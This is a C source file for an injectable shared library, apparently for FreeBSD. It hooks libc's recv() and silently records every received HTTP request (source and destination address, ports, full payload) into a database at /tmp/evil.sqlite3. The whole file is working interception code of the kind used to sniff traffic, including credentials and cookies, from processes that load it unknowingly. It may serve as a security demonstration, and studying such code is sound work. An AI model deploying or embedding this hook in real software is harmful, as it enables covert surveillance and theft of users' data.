/*
 * Copyright (c) 2018, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above
 *      copyright notice, this list of conditions and the following
 *      disclaimer in the documentation and/or other materials
 *      provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <sqlite3.h>

static void log_packet(int, const void *, size_t);

ssize_t (*orig_recv)(int, void *, size_t, int);

sqlite3 *db;

static void
log_packet(int s, const void *msg, size_t len)
{
	struct sockaddr_in dst, src;
	char dstip[16], srcip[16];
	sqlite3_stmt *stmt;
	const char **tail;
	socklen_t socklen;
	time_t t;
	int err;

	if (db == NULL) {
		return;
	}

	memset(&src, 0, sizeof(src));
	memset(&dst, 0, sizeof(dst));
	t = time(NULL);

	socklen = sizeof(src);
	if (getsockname(s, (struct sockaddr *)&src, &socklen)) {
		return;
	}
	inet_ntoa_r(src.sin_addr, srcip, socklen);

	socklen = sizeof(dst);
	if (getpeername(s, (struct sockaddr *)&dst, &socklen)) {
		return;
	}
	inet_ntoa_r(dst.sin_addr, dstip, socklen);

	stmt = NULL;
	err = sqlite3_prepare(db, "insert into entries "
	    "(srcip, srcport, dstip, dstport, payload, timestamp) "
	    "values (?, ?, ?, ?, ?, ?)", -1, &stmt, NULL);
	if (err != SQLITE_OK) {
		return;
	}

	sqlite3_bind_text(stmt, 1, srcip, -1, SQLITE_STATIC);
	sqlite3_bind_int(stmt, 2, ntohs(src.sin_port));
	sqlite3_bind_text(stmt, 3, dstip, -1, SQLITE_STATIC);
	sqlite3_bind_int(stmt, 4, ntohs(dst.sin_port));
	sqlite3_bind_text(stmt, 5, msg, len, SQLITE_STATIC);
	sqlite3_bind_int(stmt, 6, t);

	sqlite3_step(stmt);
	sqlite3_finalize(stmt);
}

ssize_t
recv(int s, void *msg, size_t len, int flags)
{
	ssize_t res;
	size_t i;
	int found;
	char *search_str[] = {
		"GET",
		"HTTP",
		NULL
	};

	res = orig_recv(s, msg, len, flags);
	if (res < 0)
		return (res);

	found = 1;
	for (i = 0; search_str[i] != NULL; i++) {
		if (!memmem(msg, (size_t)res, search_str[i],
		    strlen(search_str[i]))) {
			found = 0;
		}
	}

	if (found) {
		log_packet(s, msg, (size_t)res);
	}

	return (res);
}

__attribute__((constructor)) void
init(void)
{
	void *handle;
	int err;

	handle = dlopen("/lib/libc.so.7",
	    RTLD_GLOBAL | RTLD_LAZY);
	if (handle == NULL) {
		exit(1);
	}

	orig_recv = dlsym(handle, "recv");
	if (orig_recv == NULL) {
		exit(1);
	}

	err = sqlite3_open("/tmp/evil.sqlite3", &db);
	if (err != SQLITE_OK) {
		exit(1);
	}
}

__attribute__((destructor)) void
fini(void)
{
	if (db != NULL) {
		sqlite3_close(db);
	}
}
